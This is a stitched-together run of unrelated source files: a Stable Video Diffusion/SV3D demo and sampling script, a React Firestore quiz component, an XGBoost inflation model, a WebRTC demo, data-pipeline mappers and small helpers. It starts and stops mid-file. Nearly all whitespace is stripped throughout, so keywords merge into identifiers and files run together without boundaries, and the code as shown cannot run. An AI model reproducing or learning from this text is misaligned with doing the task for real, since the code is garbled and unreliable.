ut_noise"],"num_steps":25,},},"svd_xt":{"T":25,"H":576,"W":1024,"C":4,"f":8,"config":"configs/inference/svd.yaml","ckpt":"checkpoints/svd_xt.safetensors","options":{"discretization":1,"cfg":3.0,"min_cfg":1.5,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":2,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise"],"num_steps":30,"decoding_t":14,},},"svd_xt_image_decoder":{"T":25,"H":576,"W":1024,"C":4,"f":8,"config":"configs/inference/svd_image_decoder.yaml","ckpt":"checkpoints/svd_xt_image_decoder.safetensors","options":{"discretization":1,"cfg":3.0,"min_cfg":1.5,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":2,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise"],"num_steps":30,"decoding_t":14,},},"sv3d_u":{"T":21,"H":576,"W":576,"C":4,"f":8,"config":"configs/inference/sv3d_u.yaml","ckpt":"checkpoints/sv3d_u.safetensors","options":{"discretization":1,"cfg":2.5,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":3,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise"],"num_steps":50,"decoding_t":14,},},"sv3d_p":{"T":21,"H":576,"W":576,"C":4,"f":8,"config":"configs/inference/sv3d_p.yaml","ckpt":"checkpoints/sv3d_p.safetensors","options":{"discretization":1,"cfg":2.5,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":3,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise"],"num_steps":50,"decoding_t":14,},},}if__name__=="__main__":st.title("StableVideoDiffusion/SV3D")version=st.selectbox("ModelVersion",[kforkinVERSION2SPECS.keys()],0,)version_dict=VERSION2SPECS[version]ifst.checkbox("LoadModel"):mode="img2vid"else:mode="skip"H=st.sidebar.number_input("H",value=version_dict["H"],min_value=64,max_value=2048)W=st.sidebar.number_input("W",value=version_dict["W"],min_value=64,max_value=2048)T=st.sidebar.number_input("T",value=version_dict["T"],min_value=0,max_value=128)C=version_dict["C"]F=version_dict["f"]options=version_dict["options"]ifmode!="skip":state=init_st(version_dict,load_filter=True)ifstate["msg"]:st.info(state["msg"])model=state["model"]ukeys=set(get_unique_embedder_keys_from_conditioner(state["model"].conditioner))value_dict=init_embedder_options(ukeys,{},)if"fps"notinukeys:value_dict["fps"]=10value_dict["image_only_indicator"]=0ifmode=="img2vid":img=load_img_for_prediction(W,H)if"sv3d"inversion:cond_aug=1e-5else:cond_aug=st.number_input("Conditioningaugmentation:",value=0.02,min_value=0.0)value_dict["cond_frames_without_noise"]=imgvalue_dict["cond_frames"]=img+cond_aug*torch.randn_like(img)value_dict["cond_aug"]=cond_augif"sv3d_p"inversion:elev_deg=st.number_input("elev_deg",value=5,min_value=-90,max_value=90)trajectory=st.selectbox("Trajectory",["sameelevation","dynamic"],0,)iftrajectory=="sameelevation":value_dict["polars_rad"]=np.array([np.deg2rad(90-elev_deg)]*T)value_dict["azimuths_rad"]=np.linspace(0,2*np.pi,T+1)[1:]eliftrajectory=="dynamic":azim_rad,elev_rad=gen_dynamic_loop(length=21,elev_deg=elev_deg)value_dict["polars_rad"]=np.deg2rad(90)-elev_radvalue_dict["azimuths_rad"]=azim_radelif"sv3d_u"inversion:elev_deg=st.number_input("elev_deg",value=5,min_value=-90,max_value=90)value_dict["polars_rad"]=np.array([np.deg2rad(90-elev_deg)]*T)value_dict["azimuths_rad"]=np.linspace(0,2*np.pi,T+1)[1:]seed=st.sidebar.number_input("seed",value=23,min_value=0,max_value=int(1e9))seed_everything(seed)save_locally,save_path=init_save_locally(os.path.join(SAVE_PATH,version),init_value=True)if"sv3d"inversion:plot_save_path=os.path.join(save_path,"plot_3D.png")plot_3D(azim=value_dict["azimuths_rad"],polar=value_dict["polars_rad"],save_path=plot_save_path,dynamic=("sv3d_p"inversion),)st.image(plot_save_path,f"3Dcameratrajectory",)options["num_frames"]=Tsampler,num_rows,num_cols=init_sampling(options=options)num_samples=num_rows*num_colsdecoding_t=st.number_input("Decodetframesatatime(setsmallifyouarelowonVRAM)",value=options.get("decoding_t",T),min_value=1,max_value=int(1e9),)ifst.checkbox("Overwritefpsinmp4generator",False):saving_fps=st.number_input(f"savingvideoatfps:",value=value_dict["fps"],min_value=1)else:saving_fps=value_dict["fps"]ifst.button("Sample"):out=do_sample(model,sampler,value_dict,num_samples,H,W,C,F,T=T,batch2model_input=["num_video_frames","image_only_indicator"],force_uc_zero_embeddings=options.get("force_uc_zero_embeddings",None),force_cond_zero_embeddings=options.get("force_cond_zero_embeddings",None),return_latents=False,decoding_t=decoding_t,)ifisinstance(out,(tuple,list)):samples,samples_z=outelse:samples=outsamples_z=Noneifsave_locally:save_video_as_grid_and_mp4(samples,save_path,T,fps=saving_fps)fromenumimportEnumclassFinger(Enum):INDEX_LEFT=1MIDDLE_LEFT=2RING_LEFT=3PINKY_LEFT=4INDEX_RIGHT=5MIDDLE_RIGHT=6RING_RIGHT=7PINKY_RIGHT=8finger_map={Finger.PINKY_LEFT:[0,1,2,3,26,27,52,53,74,75],Finger.RING_LEFT:[4,5,28,29,54,55,76,77],Finger.MIDDLE_LEFT:[6,7,30,31,56,57],Finger.INDEX_LEFT:[8,9,10,11,32,33,34,35,58,59,60,61,78,79,80,81,82,83],Finger.INDEX_RIGHT:[12,13,14,15,36,37,38,39,62,63,64,65,84,85,86,87],Finger.MIDDLE_RIGHT:[16,17,40,41,66,67,88,89],Finger.RING_RIGHT:[18,19,42,43,44,45,68,69,90,91],Finger.PINKY_RIGHT:[20,21,22,23,24,25,46,47,48,49,50,51,70,71,72,73,92,93]}#invertthefinger_mapfinger_map={key:[kfork,vinfinger_map.items()ifkeyinv][0]forkeyinrange(94)}print(finger_map)importReact,{useState,useEffect}from'react';import{FontAwesomeIcon}from'@fortawesome/react-fontawesome';import{faBookmark}from'@fortawesome/free-solid-svg-icons';import{db}from'@/firebase/firebase';import{doc,onSnapshot}from'firebase/firestore';import{updateCompletedQuestions,updateMissedQuestions,replaceMissedQuestions,}from'./DatabaseUtils';constQuestion=({question,setQuestion,getNextQuestion,userId,category})=>{const[attempted,setAttempted]=useState(false);const[completed,setCompleted]=useState(false);const[completedQuestions,setCompletedQuestions]=useState([]);const[missedQuestions,setMissedQuestions]=useState([]);const[isBookmarked,setIsBookmarked]=useState(false);//getcompletedandmissedquestionsfromfirestoreuseEffect(()=>{constdocRef=doc(db,'users',userId);constunsub=onSnapshot(docRef,(doc)=>{if(doc.exists()){constuserData=doc.data();constcompletedQuestions=userData[category]['completedQuestions'];constmissedQuestions=userData[category]['missedQuestions'];setCompletedQuestions(completedQuestions);setMissedQuestions(missedQuestions);//ifcurrentquestionisinmissedQuestions,setIsBookmarkedtotrueif(missedQuestions.includes(question.id)){setIsBookmarked(true);}}else{console.log('Nosuchdocument!');}});returnunsub;},[category,userId,question.id]);useEffect(()=>{setAttempted(false);setCompleted(false);},[question]);//getbookmarkedstatusfromfirestore(bookmarkedQuestions==missedQuestions)useEffect(()=>{constdocRef=doc(db,'users',userId);constunsub=onSnapshot(docRef,(doc)=>{if(doc.exists()){constuserData=doc.data();constbookmarkedQuestions=userData[category]['missedQuestions'];if(bookmarkedQuestions.includes(question.id)){setIsBookmarked(true);}else{setIsBookmarked(false);}}else{console.log('Nosuchdocument!');}});returnunsub;});consthandleCheckAnswer=()=>{letselectedAnswerIndex=getSelectedAnswerIndex();if(selectedAnswerIndex===-1){return;}if(checkAnswer(question,selectedAnswerIndex)){setAttempted(true);setCompleted(true);setCompletedQuestions(updateCompletedQuestions(question,userId,category,completedQuestions,missedQuestions));}else{setAttempted(true);setCompleted(false);if(!missedQuestions.includes(question.id)){setMissedQuestions(updateMissedQuestions(question,userId,category,completedQuestions,missedQuestions));}}};constgetSelectedAnswerIndex=()=>{constbuttons=document.getElementsByName(`question-${question.id}`);for(leti=0;i<buttons.length;i++){if(buttons[i].checked){returni;}}return-1;};constcheckAnswer=(question,selectedAnswerIndex)=>{returnquestion.correctAnswerIndex===selectedAnswerIndex;};consthandleNextQuestion=()=>{setQuestion(getNextQuestion());setAttempted(false);setCompleted(false);};consthandleBookmarkQuestion=()=>{letnewMissedQuestions;if(isBookmarked){newMissedQuestions=missedQuestions.filter((missedQuestionId)=>missedQuestionId!==question.id);}else{newMissedQuestions=[...missedQuestions,question.id];}setMissedQuestions(replaceMissedQuestions(userId,category,completedQuestions,newMissedQuestions));setIsBookmarked(!isBookmarked);};return(<divkey={question.id}className='m-4p-2border-b'><divclassName='flexflex-rowitems-center'><h2className='basis-7/8text-lgfont-semibold'>{question.question}</h2></div><divclassName='mt-2'>{question.options.map((option,optionIndex)=>(<labelkey={optionIndex}className='block'><inputtype='radio'name={`question-${question.id}`}value={optionIndex}className='mr-2'disabled={completed}/>{option}</label>))}</div><div><buttonid='check-answer-button'className={'mt-2mx-1px-4py-2bg-blue-500text-whiteroundedtransition-colors'+(completed?'bg-gray-400':'hover:bg-blue-600')}disabled={completed}onClick={()=>{handleCheckAnswer();}}>CheckAnswer</button>{/*shownextbuttoniftherightanswerwaschecked*/}{completed&&(<buttonclassName='mt-2mx-1px-4py-2bg-green-500text-whiteroundedhover:bg-green-600transition-colors'onClick={()=>{handleNextQuestion();}}>Next</button>)}{/*bookmarkbuttononnewline*/}<buttonid='bookmark-button'className={`mt-2mx-1pl-3py-1pr-3borderrounded${isBookmarked?'border-gray-700bg-gray-700text-white':'border-gray-500bg-gray-100text-black'}hover:border-gray-400hover:bg-gray-400hover:text-whitetransition-colorsease-out`}onClick={()=>{handleBookmarkQuestion();}}><FontAwesomeIconclassName='mr-2'icon={faBookmark}/>Bookmark</button></div>{/*showexplanationorincorrectmessage*/}{attempted&&(<pclassName={`mt-2${completed?'text-green-500':'text-red-500'}`}>{completed?question.explanation:'Incorrect,tryagain!'}</p>)}</div>);};exportdefaultQuestion;importnumpyasnpimportpandasaspdimportmatplotlib.pyplotaspltimportseabornassnsimportpickleimportwarningswarnings.filterwarnings('ignore')palette=sns.color_palette()fromsklearn.multioutputimportMultiOutputRegressorfromsklearn.metricsimportmean_squared_errorfromsklearn.model_selectionimportGridSearchCV,KFoldimportxgboostasxgbdf=pd.read_csv('data/inflation.csv',index_col=0,parse_dates=True)df['year']=df.index.yeardf['month']=df.index.monthdf['quarter']=df.index.quarterdf['dayofyear']=df.index.dayofyeardependent='inflation'independent=['year','month','quarter','dayofyear']train=df[df.index.year<2018]test=df[df.index.year>=2018]#parameters={'nthread':[4],#whenusehyperthread,xgboostmaybecomeslower#'objective':['reg:squarederror'],#'learning_rate':[0.01,0.05,0.1],#socalled`eta`value#'max_depth':[5,6,7,8],#'min_child_weight':[10,11,12],#'silent':[1],#'subsample':[0.8],#'colsample_bytree':[0.7],#'n_estimators':[10,100,1000],#numberoftrees,changeitto1000forbetterresults#'missing':[-999],#'seed':[1337]}model=xgb.XGBRegressor()#model=GridSearchCV(#model,#parameters,#n_jobs=5,#cv=KFold(n_splits=5,shuffle=True),#scoring='roc_auc',#verbose=10,#refit=True,#)#withopen('models/inflation.pkl','rb')asf:#model=pickle.load(f)model.fit(train[independent],train[dependent],eval_set=[(test[independent],test[dependent])],verbose=100)#withopen('models/inflation.pkl','wb')asf:#pickle.dump(model,f)test['prediction']=model.predict(test[independent])df=df.merge(test['prediction'],how='left',left_index=True,right_index=True)ax=df['inflation'].plot(figsize=(20,10),color=palette[0],title='Inflation')df['prediction'].plot(ax=ax,color=palette[1],style='.')plt.legend(['Inflation','Prediction'])ax.set_title('InflationRateandPrediction')plt.show()constmongoose=require('mongoose');constconnectDB=async()=>{try{awaitmongoose.connect(process.env.DATABASE_URI);}catch(err){console.log(err);}};module.exports=connectDB;importtorchclassUnitWeighting:def__call__(self,sigma):returntorch.ones_like(sigma,device=sigma.device)classEDMWeighting:def__init__(self,sigma_data=0.5):self.sigma_data=sigma_datadef__call__(self,sigma):return(sigma**2+self.sigma_data**2)/(sigma*self.sigma_data)**2classVWeighting(EDMWeighting):def__init__(self):super().__init__(sigma_data=1.0)classEpsWeighting:def__call__(self,sigma):returnsigma**-2.0#withopen('questions.txt',encoding='utf-8')asf:withopen(r'C:\Users\natha\Programming\deca-dash\data\processing\questions.txt',encoding='utf-8')asf:raw=f.read()raw=raw.replace('','').split('\n')defis_question(line):returnline[0].isdigit()and'.'inline[1:4]and'37.0326'notinlinedefis_answer(line):returnline[0]in{'A','B','C','D'}andline[1]=='.'processed=[]fori,lineinenumerate(raw):ifnot(any(char.isalnum()forcharinline)):#noalphanumericcharacterscontinueif(line.startswith('Test')):continueif(line.startswith('Copyright')):continueifnot(is_question(line)oris_answer(line)):if(len(processed)==0):continueprocessed[-1]+=''+lineelse:processed.append(line[line.find('.')+1:])#processed.append(line)importnumpyasnpprocessed=np.array(processed).reshape(-1,5)#printoutprocessedwithnumberinfrontofeachquestionanda,b,c,ordinfrontofeachanswer#importsys#sys.stdout=open('delete.txt','w')#fori,lineinenumerate(processed):#print([str(int(i/5)),'A.','B.','C.','D.'][i%5]+line)#1/0importpandasaspddf=pd.DataFrame(processed,columns=['question','a','b','c','d'])#df.to_csv('questions.csv',index=False)print(df)constlocalVideo=document.getElementById("local-video");constremotesDiv=document.getElementById("remotes");/*eslint-envbrowser*/constjoinBtn=document.getElementById("join-btn");constleaveBtn=document.getElementById("leave-btn");constpublishBtn=document.getElementById("publish-btn");constpublishSBtn=document.getElementById("publish-simulcast-btn");constcodecBox=document.getElementById("select-box1");constresolutionBox=document.getElementById("select-box2");constsimulcastBox=document.getElementById("check-box");constlocalData=document.getElementById("local-data");constremoteData=document.getElementById("remote-data");constremoteSignal=document.getElementById("remote-signal");constsubscribeBox=document.getElementById("select-box3");constsizeTag=document.getElementById("size-tag");constbrTag=document.getElementById("br-tag");letlocalDataChannel;lettrackEvent;consturl='http://localhost:5551';constuid=uuidv4();constsid="ion";letroom;letrtc;letlocalStream;letstart;constjoin=async()=>{console.log("[join]:sid="+sid+"uid=",uid)constconnector=newIon.Connector(url,"token");connector.onopen=function(service){console.log("[onopen]:service=",service.name);};connector.onclose=function(service){console.log('[onclose]:service='+service.name);};joinBtn.disabled="true";leaveBtn.removeAttribute('disabled');publishBtn.removeAttribute('disabled');publishSBtn.removeAttribute('disabled');rtc=newIon.RTC(connector);rtc.ontrack=(track,stream)=>{console.log("got",track.kind,"track",track.id,"forstream",stream.id);if(track.kind==="video"){track.onunmute=()=>{if(!streams[stream.id]){constremoteVideo=document.createElement("video");remoteVideo.srcObject=stream;remoteVideo.autoplay=true;remoteVideo.muted=true;remoteVideo.addEventListener("loadedmetadata",function(){sizeTag.innerHTML=`${remoteVideo.videoWidth}x${remoteVideo.videoHeight}`;});remoteVideo.onresize=function(){sizeTag.innerHTML=`${remoteVideo.videoWidth}x${remoteVideo.videoHeight}`;};remotesDiv.appendChild(remoteVideo);streams[stream.id]=stream;stream.onremovetrack=()=>{if(streams[stream.id]){remotesDiv.removeChild(remoteVideo);streams[stream.id]=null;}};getStats();}};}};rtc.ontrackevent=function(ev){console.log("ontrackevent:\nuid=",ev.uid,"\nstate=",ev.state,",\ntracks=",JSON.stringify(ev.tracks));if(trackEvent===undefined){console.log("storetrackEvent=",ev)trackEvent=ev;}remoteSignal.innerHTML=remoteSignal.innerHTML+JSON.stringify(ev)+'\n';};rtc.join(sid,uid);conststreams={};start=(sc)=>{publishSBtn.disabled="true";publishBtn.disabled="true";letconstraints={resolution:resolutionBox.options[resolutionBox.selectedIndex].value,codec:codecBox.options[codecBox.selectedIndex].value,audio:true,simulcast:sc,}console.log("getUserMediaconstraints=",constraints)Ion.LocalStream.getUserMedia(constraints).then((media)=>{localStream=media;localVideo.srcObject=media;localVideo.autoplay=true;localVideo.controls=true;localVideo.muted=true;rtc.publish(media);localDataChannel=rtc.createDataChannel(uid);}).catch(console.error);};rtc.ondatachannel=({channel})=>{channel.onmessage=({data})=>{console.log("datachannelmsg:",data)remoteData.innerHTML=data;};};}constsend=()=>{if(!localDataChannel||!localDataChannel.readyState){alert('publishfirst!','',{confirmButtonText:'OK',});return}if(localDataChannel.readyState==="open"){console.log("datachannelsend:",localData.value)localDataChannel.send(localData.value);}};constleave=()=>{console.log("[leave]:sid="+sid+"uid=",uid)rtc.leave(sid,uid);joinBtn.removeAttribute('disabled');leaveBtn.disabled="true";publishBtn.disabled="true";publishSBtn.disabled="true";location.reload();}constsubscribe=()=>{letlayer=subscribeBox.valueconsole.log("subscribetrackEvent=",trackEvent,"layer=",layer)varinfos=[];trackEvent.tracks.forEach(t=>{if(t.layer===layer&&t.kind==="video"){infos.push({track_id:t.id,mute:t.muted,layer:t.layer,subscribe:true});}if(t.kind==="audio"){infos.push({track_id:t.id,mute:t.muted,layer:t.layer,subscribe:true});}});console.log("subscribeinfos=",infos)rtc.subscribe(infos);}constcontrolLocalVideo=(radio)=>{if(radio.value==="false"){localStream.mute("video");}else{localStream.unmute("video");}};constcontrolLocalAudio=(radio)=>{if(radio.value==="false"){localStream.mute("audio");}else{localStream.unmute("audio");}};constgetStats=()=>{letbytesPrev;lettimestampPrev;setInterval(()=>{rtc.getSubStats(null).then((results)=>{results.forEach((report)=>{constnow=report.timestamp;letbitrate;if(report.type==="inbound-rtp"&&report.mediaType==="video"){constbytes=report.bytesReceived;if(timestampPrev){bitrate=(8*(bytes-bytesPrev))/(now-timestampPrev);bitrate=Math.floor(bitrate);}bytesPrev=bytes;timestampPrev=now;}if(bitrate){brTag.innerHTML=`${bitrate}kbps@${report.framesPerSecond}fps`;}});});},1000);};functionsyntaxHighlight(json){json=json.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");returnjson.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,function(match){letcls="number";if(/^"/.test(match)){if(/:$/.test(match)){cls="key";}else{cls="string";}}elseif(/true|false/.test(match)){cls="boolean";}elseif(/null/.test(match)){cls="null";}return'<spanclass="'+cls+'">'+match+"</span>";});}importwarningsfromtypingimportUnion,List,DictfromomegaconfimportDictConfig,ListConfigimportnumpyasnpimporttorchimporttorchvision.transformsasTTfromtorchvision.transforms.functionalimportInterpolationModefrom.baseimportAbstractMapperfrom..datapipelineimportinstantiate,time_measure,timeout_wrapperclassRescaler(AbstractMapper):def__init__(self,key:Union[List[str],ListConfig,str]="jpg",isfloat:bool=True,strict:bool=True,*args,**kwargs,):""":paramkey:thekeyindicatingthesample:paramisfloat:boolindicatingwhetherinputisfloatin[0,1]oruintin[0.255]"""#keepingnameoffirstargumenttobe'key'forthesakeofbackwardscompatibilitysuper().__init__(*args,**kwargs)ifisinstance(key,str):key=[key]self.keys=set(key)self.isfloat=isfloatself.strict=strictself.has_warned=[False,False]@timeout_wrapper@time_measure("Rescaler")def__call__(self,sample:Dict)->Dict:""":paramsample:Dictcontainingthespeficiedkey,whichshouldbeatorch.Tensorornumpyarray:return:"""ifself.skip_this_sample(sample):returnsampleifnotany(map(lambdax:xinsample,self.keys)):ifself.strict:raiseKeyError(f"Noneof{self.keys}incurrentsamplewithkeys{list(sample.keys())}")else:ifnotself.has_warned[0]:self.has_warned[0]=Truewarnings.warn(f"Noneof{self.keys}containedinsample"f"(forsamplewithkeys{list(sample.keys())})."f"Sampleisreturnedunprocessedsincestrictmodenotenabled")returnsamplematching_keys=set(self.keys.intersection(sample))iflen(matching_keys)>1:ifself.strict:raiseValueError(f"morethanonematchingkeyof{self.keys}insample{list(sample.keys())}.Thisshouldnotbethecase")else:ifnotself.has_warned[1]:warnings.warn(f"morethanonematchingkeyof{self.keys}insample{list(sample.keys())}."f"Butstrictmodedisabled,soreturningsampleunchanged")self.has_warned[1]=Truereturnsamplekey=matching_keys.pop()ifself.isfloat:sample[key]=sample[key]*2-1.0else:sample[key]=sample[key]/127.5-1.0returnsampleclassTorchVisionImageTransforms(AbstractMapper):def__init__(self,transforms:Union[Union[Dict,DictConfig],ListConfig],key:str="jpg",strict:bool=True,*args,**kwargs,):super().__init__(*args,**kwargs)self.strict=strictself.key=keychained_transforms=[]ifisinstance(transforms,(DictConfig,Dict)):transforms=[transforms]fortrfintransforms:trf=instantiate(trf)chained_transforms.append(trf)self.transform=TT.Compose(chained_transforms)@timeout_wrapper@time_measure("TorchVisionImageTransforms")def__call__(self,sample:Dict)->Union[Dict,None]:ifself.skip_this_sample(sample):returnsampleifself.keynotinsample:ifself.strict:delsamplereturnNoneelse:returnsamplesample[self.key]=self.transform(sample[self.key])returnsampleclassAddOriginalImageSizeAsTupleAndCropToSquare(AbstractMapper):"""Addstheoriginalimagesizeasparamsandcropstoasquare.Alsoaddscroppingparameters.RequiresthatnoRandomCrop/CenterCrophasbeencalledbefore"""def__init__(self,h_key:str="original_height",w_key:str="original_width",image_key:str="jpg",use_data_key:bool=True,data_key:str="json",*args,**kwargs,):super().__init__(*args,**kwargs)self.h_key,self.w_key=h_key,w_keyself.image_key=image_keyself.data_key=data_keyself.use_data_key=use_data_key@timeout_wrapper@time_measure("AddOriginalImageSizeAsTupleAndCropToSquare")def__call__(self,x:Dict)->Dict:ifself.skip_this_sample(x):returnxifself.use_data_key:h,w=map(lambday:x["json"][y],(self.h_key,self.w_key))else:h,w=map(lambday:x[y],(self.h_key,self.w_key))x["original_size_as_tuple"]=torch.tensor([h,w])jpg=x[self.image_key]ifnotisinstance(jpg,torch.Tensor)andjpg.shape[0]notin[1,3]:raiseValueError(f"{self.__class__.__name__}requiresinputimagetobeatorch.Tensorwithchannels-first")#x['jpg']shouldbechwtensorin[-1,1]atthispointsize=min(jpg.shape[1],jpg.shape[2])delta_h=jpg.shape[1]-sizedelta_w=jpg.shape[2]-sizeassertnotall([delta_h,delta_w])#weassumethattheimageisalreadyresizedsuchthatthesmallestsizeisatthedesiredsize.Thus,eiterdelta_hordelta_wmustbezerotop=np.random.randint(0,delta_h+1)left=np.random.randint(0,delta_w+1)x[self.image_key]=TT.functional.crop(jpg,top=top,left=left,height=size,width=size)x["crop_coords_top_left"]=torch.tensor([top,left])returnximportmathimportosimportsysfromglobimportglobfrompathlibimportPathfromtypingimportList,Optionalsys.path.append(os.path.realpath(os.path.join(os.path.dirname(__file__),"../../")))importcv2importimageioimportnumpyasnpimporttorchfromeinopsimportrearrange,repeatfromfireimportFirefromomegaconfimportOmegaConffromPILimportImagefromrembgimportremovefromscripts.util.detection.nsfw_and_watermark_dectectionimportDeepFloydDataFilteringfromsgm.inference.helpersimportembed_watermarkfromsgm.utilimportdefault,instantiate_from_configfromtorchvision.transformsimportToTensordefsample(input_path:str="assets/test_image.png",#Caneitherbeimagefileorfolderwithimagefilesnum_frames:Optional[int]=None,#21forSV3Dnum_steps:Optional[int]=None,version:str="svd",fps_id:int=6,motion_bucket_id:int=127,cond_aug:float=0.02,seed:int=23,decoding_t:int=14,#Numberofframesdecodedatatime!ThiseatsmostVRAM.Reduceifnecessary.device:str="cuda",output_folder:Optional[str]=None,elevations_deg:Optional[float|List[float]]=10.0,#ForSV3Dazimuths_deg:Optional[List[float]]=None,#ForSV3Dimage_frame_ratio:Optional[float]=None,verbose:Optional[bool]=False,):"""Simplescripttogenerateasinglesampleconditionedonanimage`input_path`ormultipleimages,oneforeachimagefileinfolder`input_path`.IfyourunoutofVRAM,trydecreasing`decoding_t`."""ifversion=="svd":num_frames=default(num_frames,14)num_steps=default(num_steps,25)output_folder=default(output_folder,"outputs/simple_video_sample/svd/")model_config="scripts/sampling/configs/svd.yaml"elifversion=="svd_xt":num_frames=default(num_frames,25)num_steps=default(num_steps,30)output_folder=default(output_folder,"outputs/simple_video_sample/svd_xt/")model_config="scripts/sampling/configs/svd_xt.yaml"elifversion=="svd_image_decoder":num_frames=default(num_frames,14)num_steps=default(num_steps,25)output_folder=default(output_folder,"outputs/simple_video_sample/svd_image_decoder/")model_config="scripts/sampling/configs/svd_image_decoder.yaml"elifversion=="svd_xt_image_decoder":num_frames=default(num_frames,25)num_steps=default(num_steps,30)output_folder=default(output_folder,"outputs/simple_video_sample/svd_xt_image_decoder/")model_config="scripts/sampling/configs/svd_xt_image_decoder.yaml"elifversion=="sv3d_u":num_frames=21num_steps=default(num_steps,50)output_folder=default(output_folder,"outputs/simple_video_sample/sv3d_u/")model_config="scripts/sampling/configs/sv3d_u.yaml"cond_aug=1e-5elifversion=="sv3d_p":num_frames=21num_steps=default(num_steps,50)output_folder=default(output_folder,"outputs/simple_video_sample/sv3d_p/")model_config="scripts/sampling/configs/sv3d_p.yaml"cond_aug=1e-5ifisinstance(elevations_deg,float)orisinstance(elevations_deg,int):elevations_deg=[elevations_deg]*num_framesassert(len(elevations_deg)==num_frames),f"Pleaseprovide1value,oralistof{num_frames}valuesforelevations_deg!Given{len(elevations_deg)}"polars_rad=[np.deg2rad(90-e)foreinelevations_deg]ifazimuths_degisNone:azimuths_deg=np.linspace(0,360,num_frames+1)[1:]%360assert(len(azimuths_deg)==num_frames),f"Pleaseprovidealistof{num_frames}valuesforazimuths_deg!Given{len(azimuths_deg)}"azimuths_rad=[np.deg2rad((a-azimuths_deg[-1])%360)forainazimuths_deg]azimuths_rad[:-1].sort()else:raiseValueError(f"Version{version}doesnotexist.")model,filter=load_model(model_config,device,num_frames,num_steps,verbose,)torch.manual_seed(seed)path=Path(input_path)all_img_paths=[]ifpath.is_file():ifany([input_path.endswith(x)forxin["jpg","jpeg","png"]]):all_img_paths=[input_path]else:raiseValueError("Pathisnotvalidimagefile.")elifpath.is_dir():all_img_paths=sorted([fforfinpath.iterdir()iff.is_file()andf.suffix.lower()in[".jpg",".jpeg",".png"]])iflen(all_img_paths)==0:raiseValueError("Folderdoesnotcontainanyimages.")else:raiseValueErrorforinput_img_pathinall_img_paths:if"sv3d"inversion:image=Image.open(input_img_path)ifimage.mode=="RGBA":passelse:#removebgimage.thumbnail([768,768],Image.Resampling.LANCZOS)image=remove(image.convert("RGBA"),alpha_matting=True)#resizeobjectinframeimage_arr=np.array(image)in_w,in_h=image_arr.shape[:2]ret,mask=cv2.threshold(np.array(image.split()[-1]),0,255,cv2.THRESH_BINARY)x,y,w,h=cv2.boundingRect(mask)max_size=max(w,h)side_len=(int(max_size/image_frame_ratio)ifimage_frame_ratioisnotNoneelsein_w)padded_image=np.zeros((side_len,side_len,4),dtype=np.uint8)center=side_len//2padded_image[center-h//2:center-h//2+h,center-w//2:center-w//2+w,]=image_arr[y:y+h,x:x+w]#resizeframeto576x576rgba=Image.fromarray(padded_image).resize((576,576),Image.LANCZOS)#whitebgrgba_arr=np.array(rgba)/255.0rgb=rgba_arr[...,:3]*rgba_arr[...,-1:]+(1-rgba_arr[...,-1:])input_image=Image.fromarray((rgb*255).astype(np.uint8))else:withImage.open(input_img_path)asimage:ifimage.mode=="RGBA":input_image=image.convert("RGB")w,h=image.sizeifh%64!=0orw%64!=0:width,height=map(lambdax:x-x%64,(w,h))input_image=input_image.resize((width,height))print(f"WARNING:Yourimageisofsize{h}x{w}whichisnotdivisibleby64.Weareresizingto{height}x{width}!")image=ToTensor()(input_image)image=image*2.0-1.0image=image.unsqueeze(0).to(device)H,W=image.shape[2:]assertimage.shape[1]==3F=8C=4shape=(num_frames,C,H//F,W//F)if(H,W)!=(576,1024)and"sv3d"notinversion:print("WARNING:Theconditioningframeyouprovidedisnot576x1024.Thisleadstosuboptimalperformanceasmodelwasonlytrainedon576x1024.Considerincreasing`cond_aug`.")if(H,W)!=(576,576)and"sv3d"inversion:print("WARNING:Theconditioningframeyouprovidedisnot576x576.Thisleadstosuboptimalperformanceasmodelwasonlytrainedon576x576.")ifmotion_bucket_id>255:print("WARNING:Highmotionbucket!Thismayleadtosuboptimalperformance.")iffps_id<5:print("WARNING:Smallfpsvalue!Thismayleadtosuboptimalperformance.")iffps_id>30:print("WARNING:Largefpsvalue!Thismayleadtosuboptimalperformance.")value_dict={}value_dict["cond_frames_without_noise"]=imagevalue_dict["motion_bucket_id"]=motion_bucket_idvalue_dict["fps_id"]=fps_idvalue_dict["cond_aug"]=cond_augvalue_dict["cond_frames"]=image+cond_aug*torch.randn_like(image)if"sv3d_p"inversion:value_dict["polars_rad"]=polars_radvalue_dict["azimuths_rad"]=azimuths_radwithtorch.no_grad():withtorch.autocast(device):batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,[1,num_frames],T=num_frames,device=device,)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=["cond_frames","cond_frames_without_noise",],)forkin["crossattn","concat"]:uc[k]=repeat(uc[k],"b...->bt...",t=num_frames)uc[k]=rearrange(uc[k],"bt...->(bt)...",t=num_frames)c[k]=repeat(c[k],"b...->bt...",t=num_frames)c[k]=rearrange(c[k],"bt...->(bt)...",t=num_frames)randn=torch.randn(shape,device=device)additional_model_inputs={}additional_model_inputs["image_only_indicator"]=torch.zeros(2,num_frames).to(device)additional_model_inputs["num_video_frames"]=batch["num_video_frames"]defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)samples_z=model.sampler(denoiser,randn,cond=c,uc=uc)model.en_and_decode_n_samples_a_time=decoding_tsamples_x=model.decode_first_stage(samples_z)if"sv3d"inversion:samples_x[-1:]=value_dict["cond_frames_without_noise"]samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)os.makedirs(output_folder,exist_ok=True)base_count=len(glob(os.path.join(output_folder,"*.mp4")))imageio.imwrite(os.path.join(output_folder,f"{base_count:06d}.jpg"),input_image)samples=embed_watermark(samples)samples=filter(samples)vid=((rearrange(samples,"tchw->thwc")*255).cpu().numpy().astype(np.uint8))video_path=os.path.join(output_folder,f"{base_count:06d}.mp4